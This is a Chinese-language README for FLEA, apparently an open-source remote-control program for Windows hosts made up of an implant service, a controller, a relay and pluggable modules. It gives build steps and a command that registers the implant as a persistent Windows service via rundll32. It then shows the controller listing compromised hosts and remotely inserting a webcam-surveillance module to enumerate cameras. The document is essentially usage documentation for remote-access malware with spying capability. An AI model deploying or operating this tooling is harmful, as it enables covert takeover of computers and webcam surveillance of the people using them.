# FLEA

FLEA 是一个插件化的、连接不安全的远程Windows主机控制程序

## 编译

下载并安装[axe](https://github.com/li-xilin/axe)依赖库

```
$ git clone https://github.com/li-xilin/axe
$ cd axe
$ ./configure --with-pic
$ make
$ sudo make install
```

下载并编译FLEA

```
$ git clone https://github.com/li-xilin/flea
$ cd flea
$ make
```

## 源码目录

* flead Windows主机服务端，通过加载模块实现对主机的完全控制
* flea 控制端，可以向远程主机发送指令请求
* relay 中继程序，转发服务端和控制端之间交互的数据
* modules 控制模块目录，模块通过插入到远程Windows主机，进行特定的控制

## 运行示例

启动中继端

```
cd relay
$ ./relay
```

对于服务端，可以编译为Win32服务程序和PE可执行文件

对于服务程序，需要首先将服务程序拷贝到SysWOW64目录，然后通过sc命令向SCM进行服务注册

```
sc create flead c:\window\syswow64\rundll32 flead.dll,FleaMain
sc start flead
```

查询服务端列表

```
$ cd client
$ ./flea lshost -r localhost -p 123456
1 10.2.3.4
2 10.2.3.5
```

远程插入摄像头监控模块

```
$ ./flea insmod -r localhost -p 123456 -s 1 webcam
```

启动摄像头监控模块客户端，使用list子命令列出所有可用的摄像头设备

```
$ ./flea run -r localhost -p 123456 -a 1 webcam`
[1]# list
0 - Microsoft Camera Front
1 - Microsoft Camera Rear
[1]# exit
```

